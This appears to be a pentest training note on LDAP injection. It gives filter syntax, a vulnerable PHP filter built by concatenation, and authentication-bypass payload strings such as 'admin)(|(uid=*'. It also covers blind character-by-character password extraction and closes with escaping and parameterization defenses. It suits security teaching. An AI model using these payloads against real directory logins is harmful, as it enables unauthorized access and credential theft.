---
tags: [vapt, injection, intermediate]
difficulty: intermediate
module: "10 - Injection Attacks"
topic: "10.01 LDAP Injection"
---

# 10.01 — LDAP Injection

## What is LDAP?

LDAP (Lightweight Directory Access Protocol) is a protocol for querying directory services — like Active Directory. Applications use LDAP to authenticate users and look up directory information.

```
LDAP QUERY STRUCTURE:
  (&(uid=john)(password=secret))
  
  & = AND operator
  (uid=john) = filter: uid attribute equals "john"
  (password=secret) = filter: password equals "secret"

AUTHENTICATION FLOW:
  User enters: john / secret
  App builds: (&(uid=john)(password=secret))
  LDAP returns matching entry → login success!
  LDAP returns no match → login failure!
```

---

## LDAP Special Characters

```
CHARACTER   MEANING
---------   -------
*           Wildcard (matches anything)
(           Start of filter group
)           End of filter group
\           Escape character
NUL (0x00)  Null byte
!           NOT operator
&           AND operator
|           OR operator
```

---

## LDAP Injection — Authentication Bypass

```
VULNERABLE PHP CODE:
  $filter = "(&(uid=" . $username . ")(password=" . $password . "))";
  $result = ldap_search($ldap, $base_dn, $filter);

NORMAL QUERY:
  username: john, password: secret
  Filter: (&(uid=john)(password=secret))
  
ATTACK 1 — WILDCARD (no password needed!):
  username: john)(&)
  password: anything
  Filter: (&(uid=john)(&))(password=anything))
           ↑ (&) always true → authentication bypassed!
  
ATTACK 2 — COMMENT-LIKE BYPASS:
  username: *
  password: *
  Filter: (&(uid=*)(password=*))
  → Matches ANY user! First matching user logged in!

ATTACK 3 — ANOTHER BYPASS:
  username: admin)(|(uid=admin
  Filter: (&(uid=admin)(|(uid=admin)(password=anything))
  → OR condition makes password irrelevant!
```

---

## LDAP Injection Payloads

```bash
# AUTHENTICATION BYPASS:
Username: *
Password: *

Username: admin)(|(uid=*
Password: any

Username: admin)(&
Password: any

Username: *)(uid=*))(|(uid=*
Password: any

# ERROR-BASED (see what LDAP returns):
Username: )(uid=*
Password: any

# EXTRACT ALL USERS (if LDAP used for search):
?search=*
?search=)(uid=*
?search=*(|(uid=*)
```

---

## Testing for LDAP Injection

```bash
# STEP 1: INJECT SPECIAL CHARS — look for errors:
?username=john'         → Error? (unusual in LDAP)
?username=john)         → LDAP parsing error? → vulnerable!
?username=john(         → LDAP parsing error?
?username=john*         → returns extra results? → vulnerable!

# STEP 2: WILDCARD TEST:
?username=*
# If this logs in as first user → LDAP injection!

# STEP 3: BYPASS TEST:
Username: admin)(&
Password: anything
# If login succeeds → LDAP injection bypass!

# BURP INTRUDER:
# Fuzz username field with LDAP special chars: * ( ) \ & |
```

---

## Blind LDAP Injection (Data Extraction)

```
WHEN:
  App responds the same for all injections (no visible output)
  But behavior changes based on true/false conditions

TECHNIQUE — BOOLEAN BASED:
  LDAP filter: (&(uid=admin)(password=*))
  If password starts with 'a':
    Inject: admin)(password=a*
    Filter: (&(uid=admin)(password=a*))
    If response = login success (or different) → first char is 'a'!
  
  Brute-force each character:
  password=a*, password=b*, ..., password=s*
  Then: password=sa*, password=sb*, ..., password=se*
  → Eventually reconstruct the password!

AUTOMATED:
  Use LDAP-specific injection tools or manual Burp Intruder
```

---

## LDAP Filter Operators

```
LDAP BOOLEAN OPERATORS (for building injection filters):
  (&(filter1)(filter2))  = AND (both must match)
  (|(filter1)(filter2))  = OR (either must match)
  (!(filter))            = NOT
  (attribute=value)      = Equality
  (attribute=*)          = Presence (has any value)
  (attribute~=value)     = Approximately equal
  (attribute>=value)     = Greater/equal
  (attribute<=value)     = Less/equal

INJECTION PATTERNS:
  admin)(&)(             → Closes filter, adds tautology
  admin)(|(uid=admin)    → OR condition bypass
  *)(uid=*               → Wildcard + always-true condition
```

---

## Defense

```
PROTECTION:
  1. Use parameterized LDAP queries (where supported):
     // Java JNDI:
     String filter = "(uid={0})";
     search(base, filter, new String[]{username}, controls);
  
  2. Escape special characters:
     PHP: ldap_escape($input, "", LDAP_ESCAPE_FILTER)
     Java: Use LDAP encoded strings: \28, \29, \2a for (, ), *
  
  3. Allowlist: only allow alphanumeric + specific chars in LDAP fields
  
  4. Whitelist valid users on application side before LDAP query

ESCAPED CHARS:
  * = \2a
  ( = \28
  ) = \29
  \ = \5c
  NUL = \00
```

---

## Related Notes
- [[02 - XPath Injection]] — similar query language injection
- [[Module 06 - SQL Injection]] — parallel concept
- [[Module 10 - Authentication]] — auth bypass techniques
